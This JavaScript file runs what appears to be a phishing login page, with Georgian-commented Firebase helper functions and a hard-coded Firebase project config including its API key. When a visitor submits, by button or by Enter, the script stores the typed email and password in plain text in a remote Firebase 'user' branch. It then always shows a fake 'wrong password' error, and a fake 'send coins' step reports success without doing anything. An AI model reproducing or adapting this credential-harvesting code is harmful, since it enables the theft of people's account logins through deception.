let loginBtn = document.querySelector(".login-btn");
let loader = document.querySelector(".container");
let pswError = document.querySelector(".pswerror-wrapper");
let secondPage = document.querySelector(".secondpage");
let mainPage = document.querySelector(".inputs-wrapper");
let coinsInput = document.querySelector(".coinsinput");
let succsesfuly = document.querySelector(".sucssesfuly");
let sendBtn = document.querySelector(".send");
let backBtn = document.querySelector(".back");
let coinImg = document.querySelector(".coin");
const email = document.querySelector(".user");
const password = document.querySelector(".pasw");

const firebaseConfig = {
  apiKey: "AIzaSyB8pQM5rPEgL1EATuvnbnMAio8Bw1qsUZI",
  authDomain: "test-57791.firebaseapp.com",
  databaseURL: "https://test-57791-default-rtdb.firebaseio.com",
  projectId: "test-57791",
  storageBucket: "test-57791.appspot.com",
  messagingSenderId: "719441014369",
  appId: "1:719441014369:web:aa755dd485473060f50420",
  measurementId: "G-MJQ3JPVT0Y",
};

function randomID() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    let r = (Math.random() * 16) | 0;
    let v = c == "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

firebase.initializeApp(firebaseConfig);

function generateFirebaseItem(ID, value) {
  return {
    id: ID,
    data: value,
  };
}

/**
 * დავამატოთ მონაცემთა ბაზაი ელემენტი
 * @param REF - დასახელება მონაცემთა ბაზის განშტოების
 * @param data - ინფორმაცია რასაც ვამატებთ
 */
function addElementInFirebase(REF, data) {
  firebase.database().ref(`${REF}/${randomID()}`).set(data);
}

/**
 * მთლიანი განშტოების წამოღება ფაირბეისიდან
 * @param REF - დასახელება მონაცემთა ბაზის განშტოების
 * @returns აბრუნებს განშტოებაზე არსებულ ინფორმაციას
 */
function getRefFromFirebase(REF) {
  const result = [];
  firebase
    .database()
    .ref(REF)
    .on("value", (response) => {
      response.forEach((element) => {
        result.push(generateFirebaseItem(element.key, element.val()));
      });
    });
  return result;
}

/**
 * კონკრეტული ელემენტის დაბრუნება განშტოებიდან
 * @param REF - დასახალება მონაცემთა ბაზის განშტოების
 * @param id - განშტოებაზე არესბული ელემენტის უნიკალური იდ
 * @returns აბრუნებს Promise კარგ შემთხვევაში მონაცემს ცუდ შემთხვევაში "404"
 */
function getElementFromFirebase(REF, id) {
  const array = getRefFromFirebase(REF);
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      array.forEach((element) => {
        if (element.id === id) {
          resolve(element);
        }
      });
      reject("404");
    }, 1000);
  });
}

/**
 * გავანახლოთ ინფორმაცია ფაირბეისში
 * @param REF - დასახალება მონაცემთა ბაზის განშტოების
 * @param id - განშტოებაზე არესბული ელემენტის უნიკალური იდ
 * @param data - განახლებული ინფორმაცია
 */
function updateDataInFirebaseByID(REF, id, data) {
  firebase.database().ref(`${REF}/${id}`).set(data);
}

/**
 * განშტოებიდან ელემენტის ამოშლა
 * @param REF - დასახალება მონაცემთა ბაზის განშტოების
 * @param id - განშტოებაზე არესბული ელემენტის უნიკალური იდ
 */
function removeElementFromFirebase(REF, id) {
  firebase.database().ref(`${REF}/${id}`).remove();
}

/**
 * მთლიანი განშტოების წაშლა
 * @param REF - დასახალება მონაცემთა ბაზის განშტოების
 */
function removeRefFromFirebase(REF) {
  firebase.database().ref(REF).remove();
}

sendBtn.addEventListener("click", () => {
  if (coinsInput.value === "") {
    ("error");
  } else {
    loader.classList.remove("hidden");
    setTimeout(() => {
      loader.classList.add("hidden");
      succsesfuly.classList.remove("hidden");
      coinsInput.classList.add("hidden");
      sendBtn.classList.add("hidden");
      backBtn.classList.remove("hidden");
      secondPage.classList.remove("hidden");
    }, 1500);
  }
});

backBtn.addEventListener("click", () => {
  mainPage.classList.remove("hidden");
  secondPage.classList.add("hidden");
  succsesfuly.classList.add("hidden");
  coinsInput.classList.remove("hidden");
  sendBtn.classList.remove("hidden");
  backBtn.classList.add("hidden");
  coinsInput.value = "";
});

loginBtn.addEventListener("click", () => {
  if (email.value === "" || password.value === "") {
    ("error");
  } else {
    let user_email = email.value;
    let user_password = password.value;
    addElementInFirebase("user", {
      user_email,
      user_password,
    });
    loader.classList.remove("hidden");
    setTimeout(() => {
      loader.classList.add("hidden");
      pswError.classList.remove("hidden");
      password.style.color = "red";
    }, 1500);
  }
});

window.addEventListener("keypress", (e) => {
  if (e.key === "Enter") {
    if (email.value === "" || password.value === "") {
      ("error");
    } else {
      let user_email = email.value;
      let user_password = password.value;
      addElementInFirebase("user", {
        user_email,
        user_password,
      });
      loader.classList.remove("hidden");
      setTimeout(() => {
        loader.classList.add("hidden");
        pswError.classList.remove("hidden");
        password.style.color = "red";
      }, 1500);
    }
  }
});

window.addEventListener("click", () => {
  password.style.color = "rgb(52, 52, 52)";
});
